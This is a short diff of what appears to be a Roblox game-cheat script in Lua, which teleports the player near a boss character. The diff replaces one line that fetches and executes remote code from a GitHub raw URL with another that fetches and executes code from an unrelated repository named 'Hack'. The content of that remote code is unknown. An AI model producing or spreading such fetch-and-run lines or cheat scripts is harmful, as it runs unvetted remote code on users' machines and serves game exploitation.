@@ -804,12 +804,8 @@ spawn(
 
                             if doughKing then
                                 topos(doughKing.HumanoidRootPart.CFrame * CFrame.new(5, 10, 7))
-                            else
-                                loadstring(
-                                    game:HttpGet(
-                                        "https://raw.githubusercontent.com/nguyenduck18/kaitundoughking/refs/heads/main/kaitunchecktg"
-                                    )
-                                )()
+							else
+                                        loadstring(game:HttpGet("https://raw.githubusercontent.com/skibidip1/Hack/refs/heads/main/Api"))()
                             end
                         end
                     end
